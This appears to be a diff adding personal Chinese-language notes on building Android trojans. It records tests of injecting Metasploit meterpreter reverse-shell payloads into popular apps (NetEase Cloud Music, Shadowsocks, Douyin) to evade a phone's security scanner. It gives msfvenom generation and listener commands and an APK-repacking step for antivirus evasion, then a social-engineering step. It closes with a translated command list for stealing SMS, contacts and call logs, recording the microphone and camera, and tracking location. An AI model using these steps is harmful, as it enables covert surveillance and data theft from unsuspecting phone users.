@@ -1,0 +1,196 @@
+测试结果：
+1 裸：看下面
+
+
+
+2 520：
+网易云：还使用520apkhook将meterpreter_reverse_http和meterpreter/reverse_https注入进网易云都不行，表现为网易云的正常功能被破坏了，前者一连就断后者会停留一会。
+
+ss安卓客户端：
+将stager的https和tcp注入进shadowsocks，可行，表现为用户必须得使用该木马方可稳定回连，如果用户将木马置于后台而去操作其他程序那么连接持续几秒就会断开，主动挂掉后本进程将不回连。
+将inline的tcp注入ss，连一下就断。
+
+上述网易云和ss的情况都说明了stager比inline好，说明nova7相当注重静态分析。
+
+抖音：将stager的https和tcp注入进抖音，连回连都没有。
+
+
+
+3 apkinjector：no success
+
+
+
+
+
+
+
+1 查看payload有哪些：use payload/android/，有如下：
+   0  payload/android/meterpreter_reverse_http   .                normal  No     Android Meterpreter Shell, Reverse HTTP Inline   // 触发nova7管家的报警（继续使用且不移入管控），显示版本过低，打不开，打开一下回连一条连接但马上就断了
+   1  payload/android/meterpreter_reverse_https  .                normal  No     Android Meterpreter Shell, Reverse HTTPS Inline   // 和上一个http的情况一样
+   2  payload/android/meterpreter_reverse_tcp    .                normal  No     Android Meterpreter Shell, Reverse TCP Inline   // 触发nova7管家的报警（继续使用且不移入管控），显示版本过低，打不开，打开一下回连好几条tcp连接，但是一session -i就断。
+   3  payload/android/meterpreter/reverse_http   .                normal  No     Android Meterpreter, Android Reverse HTTP Stager   // 和inline的情况一致
+   4  payload/android/meterpreter/reverse_https  .                normal  No     Android Meterpreter, Android Reverse HTTPS Stager   // 和inline的情况一致
+   5  payload/android/meterpreter/reverse_tcp    .                normal  No     Android Meterpreter, Android Reverse TCP Stager   // 和inline的情况一致
+   6  payload/android/shell/reverse_http         .                normal  No     Command Shell, Android Reverse HTTP Stager   // 
+   7  payload/android/shell/reverse_https        .                normal  No     Command Shell, Android Reverse HTTPS Stager   //  
+   8  payload/android/shell/reverse_tcp          .                normal  No     Command Shell, Android Reverse TCP Stager   // 
+
+
+
+
+2 选择一款，假设你选的payload/android/meterpreter/reverse_https：
+use payload/android/meterpreter/reverse_https
+
+
+
+
+3 生成：
+msfvenom -p android/meterpreter/reverse_https LHOST=<ip addr> LPORT=<port> -o exeutable.apk
+
+
+
+4 设置监听：
+show options
+ip a
+set LHOST <ip addr>
+set LPORT <port>
+exploit
+
+
+
+5 免杀
+java -jar a520ApkHook-1.0-jar-with-dependencies.jar -o 想进行注入的App.apk exeutable.apk
+
+
+
+6 社工
+
+
+
+7 MSF meterepreter about Android：
+Core Commands
+=============
+    Command                   Description
+    -------                   -----------
+    ?                         帮助菜单
+    background         后台运行
+    bg                        背景别名
+    bgkill                    杀死后台Meterpreter脚本
+    bglist                    列出正在运行的后台脚本
+    bgrun                     作为后台线程执行Meterpreter脚本
+    channel                   显示信息或控制活动通道
+    close                     关闭频道
+    detach                    分离MeterMeter会话（对于http/https）
+    disable_unicode_encoding  禁用unicode字符串的编码
+    enable_unicode_encoding   启用unicode字符串的编码
+    exit                      终止MeterMeter会话
+    get_timeouts              获取当前会话超时值
+    guid                      获取会话GUID
+    help                      帮助菜单
+    info                      显示有关Post模块的信息
+    irb                       在当前会话上打开一个交互式Ruby shell
+    load                      加载一个或多个流量计扩展
+    machine_id                获取连接到会话的计算机的MSF ID
+    pry                       在当前会话上打开Pry调试器
+    quit                      终止MeterMeter会话
+    read                      从通道读取数据
+    resource                  运行存储在文件中的命令
+    run                       执行MeterMeter脚本或Post模块
+    secure                    （重新）协商会话上的TLV数据包加密
+    sessions                  快速切换到另一个会话
+    set_timeouts              设置当前会话超时值
+    sleep                     强制MeterMeter安静，然后重新建立会话
+    transport                 管理运输机制
+    use                       “加载”的不推荐别名
+    uuid                      获取当前会话的UUID
+    write                     将数据写入通道
+Stdapi: File system Commands
+============================
+    Command       Description
+    -------       -----------
+    cat           将文件内容读取到屏幕上
+    cd            更改目录
+    checksum      检索文件的校验和
+    cp            将源复制到目标
+    del           删除指定的文件
+    dir           列出文件（ls的别名）
+    download      下载文件或目录
+    edit          编辑文件
+    getlwd        打印本地工作目录
+    getwd         打印工作目录
+    lcd           更改本地工作目录
+    lls           列出本地文件
+    lpwd          打印本地工作目录
+    ls            列出文件
+    mkdir         制作目录
+    mv            将源移动到目标
+    pwd           打印工作目录
+    rm            删除指定的文件
+    rmdir         删除目录
+    search        搜索文件
+    upload        上传文件或目录
+Stdapi: Networking Commands
+===========================
+    Command       Description
+    -------       -----------
+    ifconfig      显示界面
+    ipconfig      显示界面
+    portfwd       将本地端口转发到远程服务
+    route         查看和修改路由表
+Stdapi: System Commands
+=======================
+    Command       Description
+    -------       -----------
+    execute       执行命令
+    getenv        获取一个或多个环境变量值
+    getuid        获取运行服务器的用户
+    localtime     显示目标系统本地日期和时间
+    pgrep         按名称筛选进程
+    ps            列出正在运行的进程
+    shell         放入系统命令外壳
+    sysinfo       获取有关远程系统的信息，例如操作系统
+Stdapi: User interface Commands
+===============================
+    Command       Description
+    -------       -----------
+    screenshare   实时观察远程用户桌面
+    screenshot    抓取交互式桌面的屏幕截图
+Stdapi: Webcam Commands
+=======================
+    Command        Description
+    -------        -----------
+    record_mic     从默认麦克风录制音频X秒
+    webcam_chat    开始视频聊天
+    webcam_list    列出网络摄像头
+    webcam_snap    从指定的网络摄像头拍摄快照
+    webcam_stream  从指定的网络摄像头播放视频流
+Stdapi: Audio Output Commands
+=============================
+    Command       Description
+    -------       -----------
+    play          在目标系统上播放波形音频文件（.wav）
+Android Commands
+================
+    Command           Description
+    -------           -----------
+    activity_start    从Uri字符串启动Android活动
+    check_root        检查设备是否root
+    dump_calllog      获取通话记录
+    dump_contacts     获取联系人列表
+    dump_sms          获取短信
+    geolocate         使用地理定位获取当前经纬度，表示格式为：longitude,latitude，不管经度还是维度，个位的精度是111公里，小数点后一位是11公里，往后依次减一个0，一般的地图软件到第6位分米级别。
+    hide_app_icon     从启动器中隐藏应用程序图标
+    interval_collect  管理间隔收集功能
+    send_sms          从目标会话发送短信
+    set_audio_mode    设置振铃器模式
+    sqlite_query      从存储器中查询SQLite数据库
+    wakelock          启用/禁用Wakelock
+    wlan_geolocate    使用WLAN信息获取当前经纬度
+Application Controller Commands
+===============================
+    Command        Description
+    -------        -----------
+    app_install    使用WLAN信息获取当前lat long
+    app_list       列出设备中已安装的应用程序
+    app_run        启动包名称的主活动
+    app_uninstall  请求卸载应用程序
